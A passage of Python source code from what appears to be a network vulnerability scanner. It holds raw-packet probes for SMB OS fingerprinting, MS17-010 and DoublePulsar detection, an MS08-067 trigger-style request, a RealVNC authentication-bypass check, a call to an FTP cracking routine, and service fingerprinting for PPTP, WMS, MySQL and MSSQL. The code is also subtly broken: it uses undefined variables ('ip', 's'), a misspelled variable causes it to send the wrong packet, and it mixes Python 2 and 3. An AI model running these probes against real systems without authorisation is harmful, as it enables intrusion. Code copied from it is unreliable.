        rbuf = sock.recv(256)
    
        if(rbuf.find("\xffSMB")):
            try:
                ret = rbuf.split("\x00");
                ret = "(%s)(%s)(%s)" % (ret[-2], ret[-3], ret[-4])
                return ret
            except:pass
        rbuf = "unknown"
        return rbuf

    def _get_host_name(self, ip):
        host_name = ""
        group_type = ""
        host_name_type = ""
        data = b'ff\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00 CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x00\x00!\x00\x01'
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.settimeout(2)
            s.sendto(data, (ip, 137))
            recv = s.recv(2000)
            if isinstance(recv, str):
                recv = bytes(recv)
            num = ord(recv[56:57].decode())
            recv = recv[57:]
            s.close()
            for i in range(num):
                name = recv[18 * i:18 *i + 15].decode()
                if str(name).strip() not in host_name_type:
                    host_name_type = host_name_type + str(name).strip() + "\\"
            host_name = host_name_type.split('\\')[0]
            group_type = host_name_type.split('\\')[1]
            return host_name, group_type
        except:
            return host_name, group_type

    def netbios_encode(self, src):  
        src = src.ljust(16,"\x20")
        names = []
        for c in src:
            char_ord = ord(c)
            high_4_bits = char_ord >> 4
            low_4_bits = char_ord & 0x0f
            names.append(high_4_bits)
            names.append(low_4_bits)
        res = b''
        for name in names:
            res += chr(0x41 + name).encode()
        return res

    def computer_info(self):
        #check share use 137/139
        host_name, group_type = self._get_host_name(self.host)		
        print(host_name)
        #host_name, group_type = self._get_host_name(self.host)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        try:
            s.connect((self.host, 139))
            name_encode = self.netbios_encode(host_name)
            payload0 = b'\x81\x00\x00D ' + name_encode  + b'\x00 EOENEBFACACACACACACACACACACACACA\x00'
            s.send(payload0)
            s.recv(1024)
            payload1 = b'\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00'
            payload2 = b'\x00\x00\x01\x0a\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x40\x00\x0c\xff\x00\x0a\x01\x04\x41\x32\x00\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x00\x00\xd4\x00\x00\xa0\xcf\x00\x60\x48\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x3e\x30\x3c\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a\xa2\x2a\x04\x28\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x07\x82\x08\xa2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x02\xce\x0e\x00\x00\x00\x0f\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x65\x00\x72\x00\x20\x00\x32\x00\x30\x00\x30\x00\x33\x00\x20\x00\x33\x00\x37\x00\x39\x00\x30\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x20\x00\x50\x00\x61\x00\x63\x00\x6b\x00\x20\x00\x32\x00\x00\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x65\x00\x72\x00\x20\x00\x32\x00\x30\x00\x30\x00\x33\x00\x20\x00\x35\x00\x2e\x00\x32\x00\x00\x00\x00\x00'
            s.send(payload1)
            s.recv(1024)
            s.send(payload2)
            ret = s.recv(1024)
            s.close()
            length = ord(ret[43:44]) + ord(ret[44:45]) * 256
            os_version = ret[47 + length:]
            result = group_type + "\\\\" + host_name + "  OS:" + os_version.replace(b'\x00\x00', b'|').replace(b'\x00', b'').decode('UTF-8', errors='ignore').rstrip('|')
            print result
        except Exception as e:
            try:
                s.connect((self.host, 445))
                payload1 = b'\x00\x00\x00\x85\xff\x53\x4d\x42\x72\x00\x00\x00\x00\x18\x53\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x00\x00\x00\x62\x00\x02\x50\x43\x20\x4e\x45\x54\x57\x4f\x52\x4b\x20\x50\x52\x4f\x47\x52\x41\x4d\x20\x31\x2e\x30\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x57\x69\x6e\x64\x6f\x77\x73\x20\x66\x6f\x72\x20\x57\x6f\x72\x6b\x67\x72\x6f\x75\x70\x73\x20\x33\x2e\x31\x61\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30\x30\x32\x00\x02\x4c\x41\x4e\x4d\x41\x4e\x32\x2e\x31\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00'
                payload2 = b'\x00\x00\x01\x0a\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xfe\x00\x00\x40\x00\x0c\xff\x00\x0a\x01\x04\x41\x32\x00\x00\x00\x00\x00\x00\x00\x4a\x00\x00\x00\x00\x00\xd4\x00\x00\xa0\xcf\x00\x60\x48\x06\x06\x2b\x06\x01\x05\x05\x02\xa0\x3e\x30\x3c\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37\x02\x02\x0a\xa2\x2a\x04\x28\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01\x00\x00\x00\x07\x82\x08\xa2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x05\x02\xce\x0e\x00\x00\x00\x0f\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x65\x00\x72\x00\x20\x00\x32\x00\x30\x00\x30\x00\x33\x00\x20\x00\x33\x00\x37\x00\x39\x00\x30\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x69\x00\x63\x00\x65\x00\x20\x00\x50\x00\x61\x00\x63\x00\x6b\x00\x20\x00\x32\x00\x00\x00\x00\x00\x57\x00\x69\x00\x6e\x00\x64\x00\x6f\x00\x77\x00\x73\x00\x20\x00\x53\x00\x65\x00\x72\x00\x76\x00\x65\x00\x72\x00\x20\x00\x32\x00\x30\x00\x30\x00\x33\x00\x20\x00\x35\x00\x2e\x00\x32\x00\x00\x00\x00\x00'
                s.send(payload1)
                s.recv(1024)
                s.send(payload2)
                ret = s.recv(1024)
                s.close()

                length = ord(ret[43:44]) + ord(ret[44:45]) * 256
                os_version = ret[47 + length:]
                result = group_type + "\\\\" + host_name + "  OS:" + os_version.replace(b'\x00\x00', b'|').replace(b'\x00', b'').decode('UTF-8', errors='ignore').rstrip('|')
                print result
            except Exception:
                if group_type != "" or host_name != "":
                    result = group_type + "\\\\" + host_name + "  OS:" + "Cann't detect the os version"
                    print result

    def smb_17010(self,sock):  
        negotiate_protocol_request = binascii.unhexlify("00000054ff534d42720000000018012800000000000000000000000000002f4b0000c55e003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200")
        session_setup_request = binascii.unhexlify("00000063ff534d42730000000018012000000000000000000000000000002f4b0000c55e0dff000000dfff02000100000000000000000000000000400000002600002e0057696e646f7773203230303020323139350057696e646f7773203230303020352e3000")
        try:
            sock.send(negotiate_protocol_request)
            sock.recv(1024)
            sock.send(session_setup_request)
            data = sock.recv(1024)
            user_id = data[32:34]
            tree_connect_andx_request = "000000%xff534d42750000000018012000000000000000000000000000002f4b%sc55e04ff000000000001001a00005c5c%s5c49504324003f3f3f3f3f00" % ((58 + len(ip)), user_id.encode('hex'), ip.encode('hex'))
            sock.send(binascii.unhexlify(tree_connect_andx_request))
            data = sock.recv(1024)
            allid = data[28:36]
            payload = "0000004aff534d422500000000180128000000000000000000000000%s1000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00" % allid.encode('hex')
            sock.send(binascii.unhexlify(payload))
            data = sock.recv(1024)
            if "\x05\x02\x00\xc0" in data:
                result =  u"%s:%sexists MS17-010 RCE vuln" % (self.host,self.port)
                print(result)
            s.close()
        except:
            pass
        finally:
            self.computer_info()

    def smb_17010_XOR(self,sock):
        #print self.host,self.port
        buffersize = 1024
        try:
            #client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            #client.settimeout(30)
            #client.connect((self.host,int(self.port)))
            client = sock
            client.settimeout(30)
            raw_proto = negotiate_proto_request()
            client.send(raw_proto)
            tcp_response = client.recv(buffersize)

            raw_proto = session_setup_andx_request()
            client.send(raw_proto)
            tcp_response = client.recv(buffersize)
            netbios = tcp_response[:4]
            smb_header = tcp_response[4:36]
            smb = SMB_HEADER(smb_header)

            user_id = struct.pack('<H', smb.user_id)

            session_setup_andx_response = tcp_response[36:]
            native_os = session_setup_andx_response[9:].split('\x00')[0]

            raw_proto = tree_connect_andx_request(self.host, user_id)
            client.send(raw_proto)
            tcp_response = client.recv(buffersize)

            netbios = tcp_response[:4]
            smb_header = tcp_response[4:36]
            smb = SMB_HEADER(smb_header)

            tree_id = struct.pack('<H', smb.tree_id)
            process_id = struct.pack('<H', smb.process_id)
            user_id = struct.pack('<H', smb.user_id)
            multiplex_id = struct.pack('<H', smb.multiplex_id)

            raw_proto = peeknamedpipe_request(tree_id, process_id, user_id, multiplex_id)
            client.send(raw_proto)
            tcp_response = client.recv(buffersize)

            netbios = tcp_response[:4]
            smb_header = tcp_response[4:36]
            smb = SMB_HEADER(smb_header)

            nt_status = struct.pack('BBH', smb.error_class, smb.reserved1, smb.error_code)
            if nt_status == '\x05\x02\x00\xc0':
                #print ("[+] [{}] is likely VULNERABLE to MS17-010! ({})".format(self.host, native_os))
                aw_proto = trans2_request(tree_id, process_id, user_id, multiplex_id)
                client.send(raw_proto)
                tcp_response = client.recv(buffersize)
                netbios = tcp_response[:4]
                smb_header = tcp_response[4:36]
                smb = SMB_HEADER(smb_header)
                if smb.multiplex_id == 0x0051:
                    key = calculate_doublepulsar_xor_key(smb.signature)
                    info = ("[{}]  is likely INFECTED with DoublePulsar! - XOR Key: {}".format(self.host,key))
                    #print info
                    return info
                else:
                    info = ("[+] [{}] is likely VULNERABLE to MS17-010! ({})".format(self.host, native_os))
                    return info
            #elif nt_status in ('\x08\x00\x00\xc0', '\x22\x00\x00\xc0'):
            #    print ("[{}]  does NOT appear vulnerable".format(self.ip))
            #else:
            #    print ("[{}]  Unable to detect if this host is vulnerable".format(self.ip))
        except Exception as e:
            #print str(e)
            pass

    def do_08067_scan(self):
        peer_00 = "\x81\x00\x00\x44\x20\x43\x4b\x46" + \
        "\x44\x45\x4e\x45\x43\x46\x44\x45" + \
        "\x46\x46\x43\x46\x47\x45\x46\x46" + \
        "\x43\x43\x41\x43\x41\x43\x41\x43" + \
        "\x41\x43\x41\x43\x41\x00\x20\x46" + \
        "\x44\x46\x44\x46\x45\x43\x4e\x46" + \
        "\x48\x45\x50\x46\x48\x43\x41\x43" + \
        "\x41\x43\x41\x43\x41\x43\x41\x43" + \
        "\x41\x43\x41\x43\x41\x41\x41\x00"
        peer_01 = "\x00\x00\x00\x2f\xff\x53\x4d\x42" + \
        "\x72\x00\x00\x00\x00\x18\x01\xc5" + \
        "\x00\x00\x00\x00\x00\x00\x00\x00" + \
        "\x00\x00\x00\x00\x00\x00\xff\xfe" + \
        "\x00\x00\x00\x00\x00\x0c\x00\x02" + \
        "\x4e\x54\x20\x4c\x4d\x20\x30\x2e" + \
        "\x31\x32\x00"
        setupaccount = "\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00\x00\x00\x00\x00\x00\x00" + \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x5c\x02" + \
        "\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff\xff\x02\x00\x5c\x02\x00" + \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x0b" + \
        "\x00\x00\x00\x4a\x43\00\x41\x54\x54\x48\x43\x00"
        peer_03 = "\x00\x00\x00\x44\xff\x53\x4d\x42" + \
        "\x75\x00\x00\x00\x00\x08\x00\x00" + \
        "\x00\x00\x00\x00\x00\x00\x00\x00" + \
        "\x00\x00\x00\x00\x00\x00\x88\x0c" + \
        "\x00\x08\x00\x00\x04\xff\x00\x00" + \
        "\x00\x00\x00\x01\x00\x19\x00\x00" + \
        "\x5c\x5c\x2a\x53\x4d\x42\x53\x45" + \
        "\x52\x56\x45\x52\x5c\x49\x50\x43" + \
        "\x24\x00\x3f\x3f\x3f\x3f\x3f\x00"
        peer_04 = "\x00\x00\x00\x5c\xff\x53\x4d\x42" + \
        "\xa2\x00\x00\x00\x00\x18\x01\x00" + \
        "\x00\x00\x00\x00\x00\x00\x00\x00" + \
        "\x00\x00\x00\x00\x00\x08\x88\x0c" + \
        "\x00\x08\x00\x00\x18\xff\x00\x00" + \
        "\x00\x00\x08\x00\x16\x00\x00\x00" + \
        "\x00\x00\x00\x00\x9f\x01\x02\x00" + \
        "\x00\x00\x00\x00\x00\x00\x00\x00" + \
        "\x00\x00\x00\x00\x03\x00\x00\x00" + \
        "\x01\x00\x00\x00\x40\x00\x00\x00" + \
        "\x02\x00\x00\x00\x03\x09\x00\x5c" + \
        "\x62\x72\x6f\x77\x73\x65\x72\x00"
        peer_05 = "\x00\x00\x00\x88\xff\x53\x4d\x42" + \
        "\x2f\x00\x00\x00\x00\x18\x01\xc5" + \
        "\x00\x00\x00\x00\x00\x00\x00\x00" + \
        "\x00\x00\x00\x00\x00\x08\xff\xfe" + \
        "\x00\x08\x05\x00\x0e\xff\x00\x00" + \
        "\x00\x00\x40\x00\x00\x00\x00\xff" + \
        "\xff\xff\xff\x08\x00\x48\x00\x00" + \
        "\x00\x48\x00\x40\x00\x00\x00\x00" + \
        "\x00\x49\x00\xee\x05\x00\x0b\x03" + \
        "\x10\x00\x00\x00\x48\x00\x00\x00" + \
        "\x01\x00\x00\x00\xb8\x10\xb8\x10" + \
        "\x00\x00\x00\x00\x01\x00\x00\x00" + \
        "\x00\x00\x01\x00\xc8\x4f\x32\x4b" + \
        "\x70\x16\xd3\x01\x12\x78\x5a\x47" + \
        "\xbf\x6e\xe1\x88\x03\x00\x00\x00" + \
        "\x04\x5d\x88\x8a\xeb\x1c\xc9\x11" + \
        "\x9f\xe8\x08\x00\x2b\x10\x48\x60" + \
        "\x02\x00\x00\x00"
        peer_06 = "\x00\x00\x00\x3b\xff\x53\x4d\x42\x2e\x00\x00\x00\x00\x18\x01\xc5" + \
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff\xfe" + \
        "\x00\x08\x06\x00\x0c\xff\x00\xde\xde\x00\x40\x00\x00\x00\x00\x00" + \
        "\x04\x00\x04\xff\xff\xff\xff\x00\x04\x00\x00\x00\x00\x00\x00"
        peer_fail = "\x00\x00\x00\x6c\xff\x53\x4d\x42" + \
        "\x25\x00\x00\x00\x00\x18\x01\xc5" + \
        "\x00\x00\x00\x00\x00\x00\x00\x00" + \
        "\x00\x00\x00\x00\x00\x08\xff\xfe" + \
        "\x00\x08\x07\x00\x10\x00\x00\x18" + \
        "\x00\x00\x00\x00\x04\x00\x00\x00" + \
        "\x00\x00\x00\x00\x00\x00\x00\x00" + \
        "\x00\x54\x00\x18\x00\x54\x00\x02" + \
        "\x00\x26\x00\x00\x40\x29\x00\x00" + \
        "\x5c\x00\x50\x00\x49\x00\x50\x00" + \
        "\x45\x00\x5c\x00\x00\x00\x00\x00" + \
        "\x05\x00\x00\x03\x10\x00\x00\x00" + \
        "\x18\x00\x00\x00\x01\x00\x00\x00" + \
        "\x00\x00\x00\x00\x00\x00\x1f\x00"
        peer_07 = "\x00\x00\x01\x68\xff\x53\x4d\x42" + \
        "\x25\x00\x00\x00\x00\x18\x01\xc5" + \
        "\x00\x00\x00\x00\x00\x00\x00\x00" + \
        "\x00\x00\x00\x00\x00\x08\xff\xfe" + \
        "\x00\x08\x07\x00\x10\x00\x00\x14" + \
        "\x01\x00\x00\x00\x04\x00\x00\x00" + \
        "\x00\x00\x00\x00\x00\x00\x00\x00" + \
        "\x00\x54\x00\x14\x01\x54\x00\x02" + \
        "\x00\x26\x00\x00\x40\x25\x01\x00" + \
        "\x5c\x00\x50\x00\x49\x00\x50\x00" + \
        "\x45\x00\x5c\x00\x00\x00\x00\x00" + \
        "\x05\x00\x00\x03\x10\x00\x00\x00" + \
        "\x14\x01\x00\x00\x01\x00\x00\x00" + \
        "\x00\xfc\x00\x00\x00\x00\x1f\x00" + \
        "\x87\x5e\x00\x00\x05\x00\x00\x00" + \
        "\x00\x00\x00\x00\x05\x00\x00\x00" + \
        "\x31\x00\x32\x00\x33\x00\x34\x00" + \
        "\x00\x00\x00\x00\x5b\x00\x00\x00" + \
        "\x00\x00\x00\x00\x5b\x00\x00\x00" + \
        "\x5c\x00\x73\x00\x73\x00\x74\x00" + \
        "\x73\x00\x73\x00\x74\x00\x5c\x00" + \
        "\x30\x00\x31\x00\x32\x00\x33\x00" + \
        "\x34\x00\x35\x00\x36\x00\x37\x00" + \
        "\x38\x00\x39\x00\x5c\x00\x2e\x00" + \
        "\x2e\x00\x5c\x00\x2e\x00\x2e\x00" + \
        "\x5c\x00\x35\x00\x35\x00\x37\x00" + \
        "\x35\x00\x35\x00\x37\x00\x35\x00" + \
        "\x35\x00\x37\x00\x35\x00\x35\x00" + \
        "\x37\x00\x35\x00\x35\x00\x37\x00" + \
        "\x61\x00\x61\x00\x61\x00\x61\x00" + \
        "\x61\x00\x61\x00\x61\x00\x61\x00" + \
        "\x61\x00\x61\x00\x61\x00\x61\x00" + \
        "\x61\x00\x61\x00\x61\x00\x61\x00" + \
        "\x61\x00\x61\x00\x61\x00\x61\x00" + \
        "\x61\x00\x61\x00\x61\x00\x61\x00" + \
        "\x61\x00\x61\x00\x61\x00\x61\x00" + \
        "\x61\x00\x61\x00\x61\x00\x61\x00" + \
        "\x61\x00\x61\x00\x61\x00\x61\x00" + \
        "\x61\x00\x61\x00\x61\x00\x61\x00" + \
        "\x61\x00\x61\x00\x61\x00\x61\x00" + \
        "\x61\x00\x61\x00\x61\x00\x61\x00" + \
        "\x61\x00\x61\x00\x00\x00\x00\x00" + \
        "\x05\x01\x00\x00\x01\x00\x00\x00" + \
        "\x00\x00\x00\x00\x01\x00\x00\x00" + \
        "\x00\x00\x00\x00\xa0\x00\x00\x00" + \
        "\x01\x00\x00\x00"

    def do_pptpd_ck(self, sock):
        rbuf = ""
        trigger = "\x00\x9c\x00\x01\x1a\x2b\x3c\x4d" + \
                "\x00\x01\x00\x00\x01\x00\x00\x00" + \
                "\x00\x00\x00\x01\x00\x00\x00\x01" + \
                "\x00\x00\xff\xff" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00" + \
                "\x00\x00\x00\x00\x00\x00\x00\x00"
        sock.send(trigger)
        rbuf = sock.recv(256)
        if(len(rbuf) > 8):
            try:
                if(rbuf[8] == '\x00' and rbuf[9] == '\x02'):
                    version = (((ord(rbuf[26]) << 0x08) & 0xff00) ^ ((ord(rbuf[27]) << 0x00) & 0xff))
                    ret = "Vendor[%s]Version[%u]" % (rbuf[92:], version)
        #    print ret
                return ret
            except:pass
        rbuf = "unknown"
        return rbuf

    def do_wms_ck(self, sock):
        rbuf = ""
        trigger = "\x01\x00\x00\x00\xce\xfa\x0b\xb0\xa0\x00\x00\x00\x4d\x4d\x53\x20" + \
        "\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
        "\x12\x00\x00\x00\x01\x00\x03\x00\xf0\xf0\xf0\xf0\x0b\x00\x04\x00" + \
        "\x1c\x00\x03\x00\x4e\x00\x53\x00\x50\x00\x6c\x00\x61\x00\x79\x00" + \
        "\x65\x00\x72\x00\x2f\x00\x31\x00\x30\x00\x2e\x00\x30\x00\x2e\x00" + \
        "\x30\x00\x2e\x00\x33\x00\x36\x00\x34\x00\x36\x00\x3b\x00\x20\x00" + \
        "\x7b\x00\x33\x00\x33\x00\x30\x00\x30\x00\x41\x00\x44\x00\x35\x00" + \
        "\x30\x00\x2d\x00\x32\x00\x43\x00\x33\x00\x39\x00\x2d\x00\x34\x00" + \
        "\x36\x00\x63\x00\x30\x00\x2d\x00\x41\x00\x45\x00\x30\x00\x41\x00" + \
        "\x2d\x00\x42\x00\x41\x00\x33\x00\x45\x00\x45\x00\x30\x00\x43\x00" + \
        "\x38\x00\x31\x00\x33\x00\x36\x00\x45\x00\x7d\x00\x00\x00\x00\x00"
        sock.send(trigger)
        rbuf = sock.recv(256)
        if(len(rbuf) > 95):
            try:
                if(rbuf[12] != 'M' and rbuf[13] != 'M' and rbuf[14] != 'S'):
                    return "unknown"
                ret = rbuf[95:95 + 36].replace("\x00", "")
        #    print ret
                return ret
            except:pass
        rbuf = "unknown"
        return rbuf
    
    def do_realvnc_ck(self, sock):
        rbuf = ""
        flag = "\x01"
        version = "RFB 003.008\n";
        rbuf = sock.recv(256)
    
        vncver = rbuf
        try:
            if(len(rbuf) > 3):
                if(rbuf[0] != 'R' and rbuf[1] != 'F' and rbuf[2] != 'B'):
                    return "unknown"
            sock.send(version)
            rbuf = sock.recv(256)
            sock.send(flag)
            rbuf = sock.recv(256)
            if(rbuf[0] == '\x00' and rbuf[1] == '\x00' and rbuf[2] == '\x00' and rbuf[3] == '\x00'):
                return "%s vulnerable!!" % (vncver.split('\n')[0])
                    
        except:pass
        return vncver.split('\n')[0]
    
    def do_dtspcd_ck(self, sock):
        rbuf = ""
        trigger = "\x30\x30\x30\x30\x30\x30\x30\x32" + \
            "\x30\x34\x30\x30\x30\x64\x30\x30" + \
            "\x30\x31\x20\x20\x34\x20\x00\x72" + \
            "\x6f\x6f\x74\x00\x00\x31\x30\x00" + \
            "\x00"
        sock.send(trigger)
        rbuf = sock.recv(256)
        try:
             if(len(rbuf) > 9):
                if(rbuf[:9] == "\x30\x30\x30\x30\x30\x30\x30\x30\x31"):
                    return rbuf[45:].split('\x00')[0]
        except:pass
        rbuf = "unknown"
        return rbuf

    def do_sshd_ck(self, sock):
        rbuf = ""
        rbuf = sock.recv(256)
        try:
            rbuf = rbuf.replace("\n", "")
            if((self.port == 21) and (vul > 0)):
                self.crack_ftp()
            return rbuf
        except:pass
        return rbuf

    def do_mysql_ck(self, sock):
        rbuf = ""
        rbuf = sock.recv(256)
        try:
            if(rbuf[3] != '\x00' or rbuf[4] != '\x0a'):
                return "unknown"
            else:
                end = rbuf[5:].find('\x00')
                return rbuf[5:5 + end]
        except:
            rbuf = "unknown"
        return rbuf

    def do_mssql_ck(self, sock):
    #http://www.sqlsecurity.com/FAQs/SQLServerVersionDatabase/tabid/63/Default.aspx
        rbuf = ""
        request = "\x12" + \
        "\x01" + \
        "\x00\x34" + \
        "\x00\x00" + \
        "\x00" + \
        "\x00" + \
        "\x00" + \
        "\x00\x15" + \
        "\x00\x06" + \
        "\x01" + \
        "\x00\x1b" + \
        "\x00\x01" + \
        "\x02" + \
        "\x00\x1c" + \
        "\x00\x0c" + \
        "\x03" + \
        "\x00\x28" + \
        "\x00\x04" + \
        "\xff" + \
        "\x08\x00\x01\x55\x00\x00" + \
        "\x00" + \
        "\x4d\x53\x53\x51\x4c\x53\x65\x72" + \
        "\x76\x65\x72\x00" + \
        "\x4e\x53\x46\x4f"
        sock.send(request)
        rbuf = sock.recv(256)
        #new start from 0xcbc
        v = [
            0x09000cee,
            0x09000ce7,
            0x09000ce6,
            0x09000ce5,
            0x09000cdf,
            0x09000cde,
            0x09000cdb,
            0x09000cd9,
            0x09000cd2,
            0x09000cbd,
            0x09000cbc,
            0x09000cbb,
            0x09000cb9,
            0x09000cac,
            0x09000ca8,
            0x09000ca7,
            0x09000ca3,
            0x09000ca1,
            0x09000ca0,
            0x09000c9f,
            0x09000c9e,
            0x09000c9c,
            0x09000c98,
            0x09000c96,
            0x09000c95,
            0x09000c8f,
            0x09000c89,
            0x09000c88,
            0x09000c86,
            0x09000c85,
            0x09000c83,
            0x09000c80,
            0x09000c7b,
            0x09000c7a,
            0x09000c72,
            0x09000c6e,
            0x09000c6c,
            0x09000c6b,
            0x09000c6a,
            0x09000c69,
            0x09000c67,
            0x09000c63,
            0x09000c61,
            0x09000c5e,
            0x09000c5a,
            0x09000c59,
            0x09000c57,
            0x09000c54,
            0x09000c53,
            0x09000c52,
            0x09000c51,
            0x09000c50,
            0x09000bfc,
            0x09000bee,
            0x09000bea,
            0x09000be3,
            0x09000be2,
            0x09000bd9,
            0x09000bd3,
            0x09000bd2,
            0x090008c5,
            0x090008c3,
            0x090008c2,
            0x090008bf,
            0x090008bd,
            0x090008bc,
            0x090008ba,
            0x090008b9,
            0x090008b8,
            0x090008b7,
            0x090008b6,
            0x090008b5,
            0x090008b3,
            0x090008b2,
            0x090008b0,
            0x090008af,
            0x090008ad,
            0x090008ab,
            0x090008aa,
            0x090008a8,
            0x090008a7,
            0x090008a6,
            0x090008a3,
            0x090008a1,
            0x090008a0,
            0x0900089f,
            0x0900089e,
            0x0900089a,
            0x09000899,
            0x09000896,
            0x09000894,
            0x09000893,
            0x09000892,
            0x09000890,
            0x0900088f,
            0x0900088e,
            0x0900088d,
            0x0900088b,
            0x09000887,
            0x09000885,
            0x09000880,
            0x0900087f,
            0x0900087e,
            0x09000877,
            0x09000874,
            0x0900086c,
            0x09000869,
            0x09000802,
            0x090007ff,
            0x090007f8,
            0x090007ed,
            0x09000619,
            0x09000616,
            0x09000612,
            0x0900060f,
            0x0900060e,
            0x0900060b,
            0x09000609,
            0x09000605,
            0x09000603,
            0x09000602,
            0x09000600,
            0x090005fe,
            0x090005fd,
            0x090005fc,
            0x090005fb,
            0x090005f8,
            0x090005ef,
            0x090005ee,
            0x090005ea,
            0x090005df,
            0x090005de,
            0x090005dc,
            0x0900057e,
            0x09000577,
            0x09000522,
            0x090004a3,
            0x0900045c,
            0x09000442,
            0x090003d5,
            0x090003b7,
            0x09000395,
            0x09000354,
            0x09000351,
            0x0900034c,
            0x09000344,
            0x09000337,
            0x09000316,
            0x090002ff,
            0x090002eb,
            0x09000285,
            0x09000260,
            0x080008e1,
            0x080008df,
            0x080008d9,
            0x080008cd,
            0x080008c9,
            0x080008c8,
            0x080008c6,
            0x080008c5,
            0x080008c4,
            0x080008c2,
            0x080008be,
            0x080008ba,
            0x080008b8,
            0x080008b7,
            0x080008b5,
            0x080008b2,
            0x080008af,
            0x080008aa,
            0x080008a9,
            0x080008a7,
            0x080008a1,
            0x0800089f,
            0x08000899,
            0x08000897,
            0x08000895,
            0x08000894,
            0x08000892,
            0x08000890,
            0x0800088f,
            0x0800088d,
            0x0800088b,
            0x08000884,
            0x0800087f,
            0x0800087c,
            0x0800087b,
            0x08000878,
            0x08000877,
            0x08000876,
            0x08000872,
            0x0800086f,
            0x0800086c,
            0x08000867,
            0x08000864,
            0x08000863,
            0x08000861,
            0x08000802,
            0x080007f8,
            0x080007f7,
            0x080007ea,
            0x0800060b,
            0x0800040d,
            0x0800040c,
            0x0800040b,
            0x0800040a,
            0x08000405,
            0x08000403,
            0x08000401,
            0x08000400,
            0x080003fd,
            0x080003fc,
            0x080003fb,
            0x080003f9,
            0x080003f6,
            0x080003f5,
            0x080003f1,
            0x080003ef,
            0x080003eb,
            0x080003e9,
            0x080003e8,
            0x080003e5,
            0x080003e4,
            0x080003e2,
            0x080003e1,
            0x080003df,
            0x080003de,
            0x080003dc,
            0x080003d9,
            0x080003d4,
            0x080003d1,
            0x080003cd,
            0x080003cc,
            0x080003ca,
            0x080003c7,
            0x080003c2,
            0x080003c1,
            0x080003bf,
            0x080003bd,
            0x080003bb,
            0x080003ba,
            0x080003b8,
            0x080003b5,
            0x080003b4,
            0x080003b0,
            0x080003a9,
            0x080003a8,
            0x080003a7,
            0x080003a6,
            0x080003a5,
